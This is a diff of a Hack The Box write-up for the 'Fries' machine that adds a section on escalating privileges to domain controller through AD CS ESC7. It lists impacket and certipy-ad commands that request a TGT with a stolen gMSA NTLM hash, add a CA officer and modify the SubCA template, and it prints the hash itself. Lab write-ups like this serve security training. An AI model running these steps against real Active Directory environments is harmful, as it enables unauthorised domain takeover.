@@ -1,12 +1,11 @@
 ---
 title: 'HTB-Fries'
-published: 2025-10-28
+published: 2025-11-25
 draft: true
 toc: true
-tags: [""]
+tags: ["ffuf", "vhosts", "docker", "docker-escape", "PostgreSQL", "nfs", "PWM", "BloodHound", "ReadGMSAPassword", "ESC7"]
 ---
 
----
 ```
 Scope:
 10.10.11.96
@@ -392,7 +391,7 @@ We can check it out:
 
 Looks good!
 
-## Linux Privilege Escalation
+# Linux Privilege Escalation
 
 We can simply use the following command to to give ourselves a *root* shell on the system:
 
@@ -483,23 +482,65 @@ And we get the NTLM hash for *gMSA_CA_prod$*.
 fc20b3d3ec179c5339ca59fbefc18f4a
 ```
 
+I checked the account information where I found the following:
 
+![](attachments/3047996bfe96826c6048da7aa01d2bb2.png)
 
+# DC01 Privilege Escalation
+## ADCS - ESC7
 
+I requested a TGT for the found user:
 
+```bash
+impacket-getTGT 'fries.htb/gMSA_CA_prod$' -hashes :fc20b3d3ec179c5339ca59fbefc18f4a -dc-ip 10.10.11.96
+```
 
+![](attachments/9ee94a31f46c3d5bf8faf9b2982d27ce.png)
 
+I then used `certipy-ad` to enumerate the ADCS vulnerabilities:
 
+```bash
+certipy-ad find -k -dc-ip 10.10.11.96 -target DC01.fries.htb -stdout -vulnerable
+```
 
+![](attachments/f7b27a2575739311a9664ee27ae4500d.png)
 
+It looks like the target is vulnerable to **ESC7**.
 
+### Exploitation
 
+First of all we'll have to modify the `/etc/krb5.conf` file:
 
+![](attachments/3f90f523af43db8636eaed6b59658c30.png)
+
+![](attachments/6aeaa356337910910a060d8525f6ea86.png)
+
+To exploit this we can use the following commands:
+
+```bash
+certipy-ad ca \
+  -ca fries-DC01-CA \
+  -add-officer 'gMSA_CA_prod$' \
+  -dc-ip 10.10.11.96 \
+  -dc-host DC01.fries.htb \
+  -target DC01.fries.htb \
+  -k
+```
+
+![](attachments/8e917acb5f5b0818799a986aa5b9c620.png)
+
+We will now have to update the templates by adding the `SubCA` template: 
+
+```bash
+certipy-ad template \                                                                                              
+  -template SubCA \
+  -save-configuration subca.json \
+  -dc-ip 10.10.11.96 \
+  -dc-host DC01.fries.htb \
+  -target DC01.fries.htb \
+  -k
+```
+
+![](attachments/cb6b659413494455d9d9d394e1116585.png)
 
 ---
-
-**Finished**
-
-[^Links]: [[Hack The Box]]
-
-#ffuf #vhosts #docker #docker-escape #PostgreSQL #nfs #PWM #BloodHound #ReadGMSAPassword
